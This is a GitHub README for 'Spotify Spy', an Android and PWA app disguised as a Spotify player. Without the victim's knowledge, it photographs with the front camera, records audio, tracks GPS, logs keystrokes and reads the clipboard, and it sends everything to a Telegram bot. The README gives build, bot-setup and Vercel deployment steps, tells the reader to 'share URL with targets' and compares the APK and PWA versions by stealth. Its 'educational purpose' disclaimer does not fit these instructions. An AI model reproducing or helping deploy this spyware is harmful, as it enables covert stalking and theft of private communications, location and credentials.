# 📱 Spotify Spy - Android Surveillance App

[![Android](https://img.shields.io/badge/Platform-Android-green.svg)](https://www.android.com/)
[![PWA](https://img.shields.io/badge/PWA-Enabled-blue.svg)](https://web.dev/progressive-web-apps/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

> **⚠️ Educational Purpose Only**: This project is for educational and research purposes. Always obtain proper consent before monitoring any device.

## 🎯 Overview

**Spotify Spy** is a hybrid Android application that demonstrates surveillance capabilities while disguised as a Spotify music player. It combines native Android code with web technologies to create an installable Progressive Web App (PWA).

### 🎭 Key Features

- **🎵 Perfect Camouflage**: Displays an actual Spotify playlist embed
- **📸 Camera Surveillance**: Captures front camera photos every 5 seconds
- **🎤 Audio Recording**: Records 10-second audio clips every 30 seconds
- **📍 GPS Tracking**: Tracks device location every 60 seconds
- **⌨️ Keylogger**: Records all keyboard inputs in real-time
- **📋 Clipboard Monitor**: Reads clipboard content every 15 seconds
- **📱 Device Information**: Collects device specs and user agent
- **💬 Telegram Integration**: Sends all data to Telegram bot automatically
- **📲 PWA Support**: Installable from web browser as standalone app

---

## 🏗️ Architecture

```
┌─────────────────────────────────────┐
│   Android Native (MainActivity)     │
│   • Permission Management           │
│   • WebView Container               │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│   Web Layer (HTML + JavaScript)     │
│   • Spotify Embed (Camouflage)      │
│   • Spy Engine (Surveillance)       │
│   • PWA Features                    │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│      Telegram Bot API               │
│      (Data Receiver)                │
└─────────────────────────────────────┘
```

---

## 📦 Quick Start

### Option 1: Android APK (Recommended for Full Features)

1. **Download APK**:
   ```bash
   # Download from releases
   # Or build from source (see Building section)
   ```

2. **Install on Android**:
   - Enable "Unknown Sources" in Settings
   - Install `app-debug.apk`
   - Allow all requested permissions

3. **Configure Telegram Bot**:
   - Edit `app/src/main/assets/index.html`
   - Replace bot token and chat ID:
     ```javascript
     const botToken = "YOUR_BOT_TOKEN";
     const chatId = "YOUR_CHAT_ID";
     ```

### Option 2: PWA via Vercel (Cross-Platform)

1. **Deploy to Vercel**:
   ```bash
   cd vercel-deploy
   vercel --prod
   ```

2. **Install as PWA**:
   - Open the Vercel URL in browser
   - Click "Install Spotify" banner or
   - Browser menu → "Add to Home Screen"

---

## 🛠️ Building from Source

### Prerequisites

- **Android Studio** (latest version)
- **JDK 17** or compatible
- **Gradle 8.7+**
- **Android SDK 34**

### Build Steps

```bash
# Clone repository
git clone https://github.com/lucuk094-crypto/spoty-spy.git
cd spoty-spy

# Build APK
./gradlew assembleDebug

# APK location:
# app/build/outputs/apk/debug/app-debug.apk
```

### Build via Android Studio

1. Open project in Android Studio
2. Sync Gradle
3. Build → Build Bundle(s) / APK(s) → Build APK(s)
4. Find APK in `app/build/outputs/apk/debug/`

---

## 📊 Surveillance Features

### Camera Spy 📸
- **Interval**: Every 5 seconds
- **Camera**: Front (selfie)
- **Format**: JPEG (80% quality)
- **Resolution**: 1280×720 (or device max)
- **Output**: Photos sent to Telegram

### Audio Spy 🎤
- **Interval**: Every 30 seconds
- **Duration**: 10 seconds per recording
- **Format**: WebM (Opus codec)
- **Output**: Audio files sent to Telegram

### GPS Tracking 📍
- **Interval**: Every 60 seconds
- **Precision**: High (ACCESS_FINE_LOCATION)
- **Data**: Latitude & Longitude coordinates
- **Output**: GPS coordinates sent to Telegram

### Keylogger ⌨️
- **Trigger**: Real-time on every key press
- **Buffer**: 30 characters before sending
- **Target**: All keyboard input
- **Output**: Captured keystrokes sent to Telegram

### Clipboard Monitor 📋
- **Interval**: Every 15 seconds
- **Target**: All copied text
- **Output**: Clipboard content sent to Telegram

### Device Info 📱
- **Trigger**: Once on app start
- **Data**: User agent, OS version, screen resolution
- **Output**: Device specifications sent to Telegram

---

## 🔧 Configuration

### Telegram Bot Setup

1. **Create Bot**:
   - Message [@BotFather](https://t.me/botfather) on Telegram
   - Send `/newbot` and follow instructions
   - Copy bot token

2. **Get Chat ID**:
   - Message [@userinfobot](https://t.me/userinfobot)
   - Copy your chat ID

3. **Update Configuration**:
   ```javascript
   // app/src/main/assets/index.html
   const botToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
   const chatId = "123456789";
   ```

---

## 📁 Project Structure

```
spotify-spy/
├── app/
│   ├── src/main/
│   │   ├── AndroidManifest.xml          # Permissions & config
│   │   ├── java/com/spotify/spy/
│   │   │   └── MainActivity.java        # Native Android code
│   │   ├── res/                         # Resources (icons, layouts)
│   │   └── assets/                      # Web files
│   │       ├── index.html               # Main app content
│   │       ├── manifest.json            # PWA manifest
│   │       ├── sw.js                    # Service Worker
│   │       └── icon-*.png               # PWA icons
│   └── build.gradle                     # App dependencies
├── vercel-deploy/                       # Ready for Vercel
│   ├── index.html
│   ├── manifest.json
│   ├── sw.js
│   ├── icon-192.png
│   ├── icon-512.png
│   └── vercel.json                      # Vercel config
├── DOKUMENTASI_LENGKAP.md               # Full documentation
├── SUMMARY.txt                          # Quick reference
└── README.md                            # This file
```

---

## 🌐 Vercel Deployment

### Deploy Steps

1. **Install Vercel CLI**:
   ```bash
   npm install -g vercel
   ```

2. **Login**:
   ```bash
   vercel login
   ```

3. **Deploy**:
   ```bash
   cd vercel-deploy
   vercel --prod
   ```

4. **Get URL**:
   - Vercel provides: `https://your-app.vercel.app`
   - Share URL with targets
   - They can install as PWA from browser

### Custom Domain (Optional)

1. Go to Vercel Dashboard → Settings → Domains
2. Add custom domain
3. Update DNS records as instructed
4. Access app via custom domain

---

## 📱 Installing as PWA

### Android (Chrome)

1. Open app URL in Chrome
2. Wait for "Install Spotify" banner
3. Tap banner (or Chrome menu → "Add to Home screen")
4. Tap "Install"
5. App icon appears on home screen

### iOS (Safari)

1. Open app URL in Safari
2. Tap Share button (⬆️)
3. Scroll and tap "Add to Home Screen"
4. Tap "Add"
5. App icon appears on home screen

### Desktop (Chrome/Edge)

1. Open app URL
2. Click install icon in address bar (⊕)
3. Click "Install"
4. App opens in standalone window

---

## 🔒 Permissions Required

- **INTERNET**: Send data to Telegram
- **CAMERA**: Capture photos
- **RECORD_AUDIO**: Record audio
- **ACCESS_FINE_LOCATION**: GPS tracking
- **ACCESS_COARSE_LOCATION**: Location fallback
- **MODIFY_AUDIO_SETTINGS**: Audio control
- **WAKE_LOCK**: Keep device awake

---

## 📊 Comparison: APK vs PWA

| Feature | APK | PWA (Vercel) |
|---------|-----|--------------|
| Camera Access | ✅ Full | ⚠️ HTTPS only |
| Microphone | ✅ Full | ⚠️ HTTPS only |
| GPS Precision | ✅ High | ⚠️ Medium |
| Background Run | ✅ Yes | ❌ No |
| Stealth Level | ✅ High | ⚠️ Medium |
| Platform | Android only | Cross-platform |
| Install Method | APK file | Browser |

**Recommendation**:
- **APK** for maximum surveillance capabilities
- **PWA** for demos, testing, or cross-platform needs

---

## ⚠️ Legal & Ethical Considerations

### ⚠️ **IMPORTANT DISCLAIMER**

This project is provided for **EDUCATIONAL PURPOSES ONLY**. The developers and contributors:

- **DO NOT** condone illegal surveillance
- **DO NOT** encourage violation of privacy laws
- **REQUIRE** explicit consent from monitored individuals
- **RECOMMEND** consulting legal counsel before deployment

### Legal Requirements

1. ✅ **Consent**: Always obtain written consent from monitored individuals
2. ✅ **Disclosure**: Inform users about data collection
3. ✅ **Compliance**: Follow local privacy and surveillance laws
4. ✅ **Purpose**: Use only for legitimate purposes (parental control, device security, etc.)

### Potential Legal Issues

- ❌ Unauthorized surveillance is **illegal** in most jurisdictions
- ❌ Violates privacy laws (GDPR, CCPA, etc.)
- ❌ Can result in criminal charges
- ❌ May violate app store policies

### Ethical Use Cases

- ✅ Parental monitoring (with child's knowledge)
- ✅ Employee monitoring (with proper disclosure & consent)
- ✅ Personal device security
- ✅ Research and education
- ✅ Cybersecurity testing (authorized environments)

---

## 🛡️ Security & Privacy

### Data Security

- All data transmitted via **HTTPS**
- Telegram API provides **end-to-end encryption**
- Bot token should be kept **confidential**
- No data stored locally (direct transmission)

### Privacy Concerns

- ⚠️ **Sensitive Data**: Captures highly sensitive information
- ⚠️ **No Encryption**: Data sent unencrypted to Telegram
- ⚠️ **Telegram Storage**: Data stored on Telegram servers
- ⚠️ **Token Security**: Exposed token = full access to data

### Best Practices

1. **Protect Bot Token**: Never commit tokens to public repos
2. **Use Environment Variables**: Store credentials separately
3. **Rotate Tokens**: Change tokens regularly
4. **Monitor Access**: Check Telegram for unauthorized access
5. **Delete Data**: Regularly purge collected data
6. **Secure Device**: Protect device with strong password

---

## 🐛 Troubleshooting

### App Crashes on Launch

- **Cause**: Permission errors or WebView issues
- **Fix**: Ensure all permissions are granted; update Android System WebView

### Camera/Mic Not Working

- **Cause**: Permissions denied or HTTPS required
- **Fix**: Allow permissions in Settings; ensure HTTPS for PWA

### GPS Inaccurate

- **Cause**: Location services disabled or indoor use
- **Fix**: Enable high-accuracy GPS; test outdoors

### Data Not Sent to Telegram

- **Cause**: Invalid bot token/chat ID or no internet
- **Fix**: Verify credentials; check internet connection

### PWA Install Banner Not Showing

- **Cause**: Not served via HTTPS or already installed
- **Fix**: Use Vercel (auto-HTTPS) or manual install via browser menu

---

## 📚 Documentation

- **[DOKUMENTASI_LENGKAP.md](DOKUMENTASI_LENGKAP.md)**: Comprehensive technical documentation
- **[SUMMARY.txt](SUMMARY.txt)**: Quick reference guide
- **[vercel-deploy/README.md](vercel-deploy/README.md)**: Deployment guide

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature-name`
3. Commit changes: `git commit -am 'Add feature'`
4. Push to branch: `git push origin feature-name`
5. Submit a Pull Request

---

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

- **Telegram Bot API**: For data transmission
- **Spotify**: For embed player used as camouflage
- **Android WebView**: For hybrid app framework
- **PWA Technologies**: For installable web apps

---

## 📞 Support

For issues, questions, or contributions:

- **GitHub Issues**: [Report a bug](https://github.com/lucuk094-crypto/spoty-spy/issues)
- **Discussions**: [GitHub Discussions](https://github.com/lucuk094-crypto/spoty-spy/discussions)

---

## ⚡ Quick Links

- 📦 **[Download APK](app/build/outputs/apk/debug/app-debug.apk)**
- 🌐 **[Vercel Deploy Files](vercel-deploy/)**
- 📚 **[Full Documentation](DOKUMENTASI_LENGKAP.md)**
- 🔧 **[Build Instructions](#building-from-source)**
- 🚀 **[Deploy to Vercel](#vercel-deployment)**

---

<div align="center">

**⚠️ Use Responsibly • Educational Purpose Only • Obtain Consent**

Made with 🔒 for Security Research

</div>
